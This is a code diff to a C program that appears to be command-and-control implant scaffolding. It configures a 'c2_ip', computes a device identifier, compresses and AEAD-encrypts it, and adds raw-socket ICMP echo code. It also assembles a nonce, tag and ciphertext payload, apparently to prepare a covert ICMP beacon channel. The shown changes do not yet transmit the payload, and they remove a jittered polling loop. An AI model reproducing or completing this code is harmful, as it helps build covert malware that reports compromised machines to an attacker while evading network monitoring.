@@ -9,12 +9,15 @@
 #include <string.h>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
+#include <sys/socket.h>
+#include <netinet/ip_icmp.h>
+#include <poll.h>
 
 struct Config {
-    struct in_addr c2_ip;
-    int minimum_poll_seconds;
-    int maximum_poll_seconds;
-    int compression_level;
+	struct in_addr c2_ip;
+	int minimum_poll_seconds;
+	int maximum_poll_seconds;
+	int compression_level;
 };
 
 uint64_t get_device_id(){
@@ -53,6 +56,90 @@ uint64_t get_device_id(){
 
 }
 
+uint16_t calculate_checksum(const unsigned char *data, size_t length) {
+
+	uint32_t checksum = 0;
+	while (length >= 2) {
+		checksum += ((uint32_t)data[0] << 8) | data[1];
+		data += 2;
+		length -= 2;
+	}
+
+	if (length == 1) {
+		checksum += (uint32_t)data[0] << 8;
+	}
+
+	while (checksum >> 16) {
+		checksum = (checksum & 0xffffu) + (checksum >> 16);
+	}
+
+	return (uint16_t)~checksum;
+
+}
+
+int send_echo_request(struct in_addr destination_ip, uint16_t sequence) {
+
+	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+	if (fd < 0) {
+		return 1;
+	}
+
+	struct sockaddr_in destination = {0};
+	destination.sin_family = AF_INET;
+	destination.sin_addr = destination_ip;
+
+	unsigned char request[8] = {0};
+	uint16_t identifier = (uint16_t)getpid();
+	request[0] = ICMP_ECHO;
+	request[4] = (unsigned char)(identifier >> 8);
+	request[5] = (unsigned char)identifier;
+	request[6] = (unsigned char)(sequence >> 8);
+	request[7] = (unsigned char)sequence;
+	uint16_t checksum = calculate_checksum(request, sizeof(request));
+	request[2] = (unsigned char)(checksum >> 8);
+	request[3] = (unsigned char)checksum;
+
+	sendto(fd, request, sizeof(request), 0, (struct sockaddr *)&destination, sizeof(destination));
+
+
+	struct pollfd waiting_socket = {
+		.fd = fd,
+		.events = POLLIN
+	};
+
+	struct timespec start_time, current_time;
+	clock_gettime(CLOCK_MONOTONIC, &start_time);
+	int remaining_time = 30000;
+
+	while (remaining_time > 0) {
+
+		clock_gettime(CLOCK_MONOTONIC, &current_time);
+		int64_t elapsed_time = (int64_t)(current_time.tv_sec - start_time.tv_sec) * 1000 + (current_time.tv_nsec - start_time.tv_nsec) / 1000000;
+		remaining_time = 30000 - (int)elapsed_time;
+
+		poll(&waiting_socket, 1, remaining_time);
+		unsigned char response[2048];
+		struct sockaddr_in sender = {0};
+		socklen_t sender_length = sizeof(sender);
+		ssize_t response_length = recvfrom(fd, response, sizeof(response), 0, (struct sockaddr *)&sender, &sender_length);
+		size_t ip_header_length = (response[0] & 0x0f) * 4;
+		if (response_length < 28 || (response[0] >> 4) != 4 || ip_header_length < 20 || (size_t)response_length < ip_header_length + 8) {
+			continue;
+		}
+		unsigned char *reply = response + ip_header_length;
+		if (sender.sin_addr.s_addr != destination_ip.s_addr || reply[0] != ICMP_ECHOREPLY || reply[1] != 0 || memcmp(reply + 4, request + 4, 4) != 0 || calculate_checksum(reply, (size_t)response_length - ip_header_length) != 0) {
+			continue;
+		}
+
+		close(fd);
+		return 0;
+
+	}
+
+	close(fd);
+	return 1;
+}
+
 int main() {
 
 	struct Config configuration = {
@@ -66,12 +153,11 @@ int main() {
 	inet_pton(AF_INET, "192.168.67.20", &configuration.c2_ip);
 	srand((int)time(NULL) ^ (int)getpid());
 
-	char message[64];
+	char message[512];
 	sprintf(message, "%016" PRIx64, device_id);
 	uLong message_length = strlen(message);
 	uLongf compressed_length = compressBound(message_length);
 	unsigned char *compressed_data = malloc(compressed_length);
-	
 	compress2(compressed_data, &compressed_length, (const unsigned char *)message, message_length, configuration.compression_level);
 
 	unsigned char encryption_key[32];
@@ -90,6 +176,19 @@ int main() {
 	EVP_CIPHER_CTX_ctrl(encryption_context, EVP_CTRL_AEAD_GET_TAG, sizeof(authentication_tag), authentication_tag);
 	EVP_CIPHER_CTX_free(encryption_context);
 
+	size_t payload_length = sizeof(nonce) + sizeof(authentication_tag) + encrypted_length;
+	unsigned char *payload = malloc(payload_length);
+	memcpy(payload, nonce, sizeof(nonce));
+	memcpy(payload + sizeof(nonce), authentication_tag, sizeof(authentication_tag));
+	memcpy(payload + sizeof(nonce) + sizeof(authentication_tag), encrypted_data, encrypted_length);
+
+
+
+
+
+
+
+
 
 
 
@@ -104,26 +203,27 @@ int main() {
 	EVP_CIPHER_CTX_free(decryption_context);
 	decrypted_length += final_decrypted_length;
 
-
 	unsigned char decompressed_data[64];
 	uLongf decompressed_length = sizeof(decompressed_data) - 1;
 	uncompress(decompressed_data, &decompressed_length, decrypted_data, (uLong)decrypted_length);
 
-	for (int i = configuration.minimum_poll_seconds; i <= configuration.maximum_poll_seconds; i++) {
-
-		int delay_before_next_poll = configuration.minimum_poll_seconds + (int)rand() % (configuration.maximum_poll_seconds - configuration.minimum_poll_seconds + 1);
 
 
 
 
 
-		sleep(delay_before_next_poll);
 
-	}
+
+
+
+
+
+
 
 	free(compressed_data);
 	free(encrypted_data);
 	free(decrypted_data);
+	free(payload);
 
 	return 0;
 }
